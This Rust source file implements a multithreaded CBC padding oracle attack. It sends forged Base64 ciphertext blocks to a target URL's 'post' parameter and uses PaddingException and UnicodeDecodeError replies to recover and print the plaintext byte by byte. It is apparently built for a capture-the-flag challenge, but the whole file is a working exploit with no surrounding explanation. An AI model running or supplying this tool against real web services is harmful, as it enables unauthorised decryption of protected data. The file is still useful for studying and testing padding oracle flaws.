use crate::shared::*;
use anyhow::Result;
use base64::{prelude::BASE64_STANDARD, Engine};
use indicatif::{MultiProgress, ProgressBar, ProgressStyle};
use parking_lot::Mutex;
use rayon::prelude::*;
use reqwest::blocking::Client;

pub fn decrypt(url: String, ciphertext: &str) -> Result<()> {
    let client = Client::new();
    let ciphertext = BASE64_STANDARD.decode(ciphertext.fix_base64())?;
    let plaintext: Mutex<[[Option<u8>; 16]; 10]> = Mutex::new([[None; 16]; 10]);
    rayon::ThreadPoolBuilder::new()
        .num_threads(64)
        .build()
        .unwrap()
        .install(|| {
            let mb = MultiProgress::new();
            let bar = mb.add(ProgressBar::new((ciphertext.len()) as u64));
            bar.set_style(
                ProgressStyle::with_template("{wide_bar} {pos}/{len} {per_sec} {eta_precise}")
                    .unwrap(),
            );
            let message = mb.insert_after(&bar, ProgressBar::new((10 / CHUNK_SIZE * 256) as u64));
            message.set_style(ProgressStyle::with_template("{wide_msg}").unwrap());
            let guard = plaintext.lock();
            message.set_message(
                guard
                    .into_iter()
                    .flatten()
                    .map(|opt| match opt {
                        Some(value) => value as char,
                        None => '░',
                    })
                    .collect::<String>()
                    .to_string(),
            );
            drop(guard);
            ciphertext
                .par_windows(CHUNK_SIZE * 2)
                .enumerate()
                .rev()
                .step_by(CHUNK_SIZE)
                .for_each(|(n, chunks)| {
                    let mut cipherblock = [0u8; 16];
                    let mut intermediate = [0u8; 16];

                    for byte in 1..=CHUNK_SIZE {
                        let guard = plaintext.lock();
                        message.set_message(
                            guard
                                .into_iter()
                                .flatten()
                                .map(|opt| match opt {
                                    Some(value) => value as char,
                                    None => '░',
                                })
                                .collect::<String>()
                                .replace('\n', " ")
                                .to_string(),
                        );
                        drop(guard);
                        if let Some(value) = (0u8..=255).into_par_iter().find_any(|&value| {
                            let mut cipherblock: [u8; 16] = cipherblock;
                            cipherblock[16 - byte] = value;
                            let encoded = BASE64_STANDARD
                                .encode(
                                    [&cipherblock, &chunks[CHUNK_SIZE..CHUNK_SIZE * 2]].concat(),
                                )
                                .fuckup_base64();
                            let res = client.get(&url).query(&[("post", encoded)]).send().unwrap();
                            let text = res.text().unwrap();

                            if !text.contains("PaddingException")
                                && (text.contains("UnicodeDecodeError")
                                    || text.contains("ValueError")
                                    || byte != 1)
                            {
                                bar.inc(1);
                                return true;
                            }
                            false
                        }) {
                            intermediate[16 - byte] = value ^ byte as u8;
                            cipherblock[16 - byte] = value;
                            for x in 1..=byte {
                                cipherblock[16 - x] = intermediate[16 - x] ^ (byte as u8 + 1);
                            }
                            let mut guard = plaintext.lock();
                            guard[n / 16][CHUNK_SIZE - byte] =
                                Some(intermediate[CHUNK_SIZE - byte] ^ chunks[CHUNK_SIZE - byte]);
                            message.set_message(
                                guard
                                    .into_iter()
                                    .flatten()
                                    .map(|opt| match opt {
                                        Some(value) => value as char,
                                        None => '░',
                                    })
                                    .collect::<String>()
                                    .trim_end_matches(|x| !char::is_ascii(&x))
                                    .to_string(),
                            );
                        }
                    }
                });
        });
    println!(
        "{}",
        String::from_utf8(
            plaintext
                .lock()
                .into_iter()
                .flatten()
                .map(|opt| opt.unwrap_or(32))
                .collect::<Vec<u8>>()
        )?
        .trim_end()
    );
    Ok(())
}
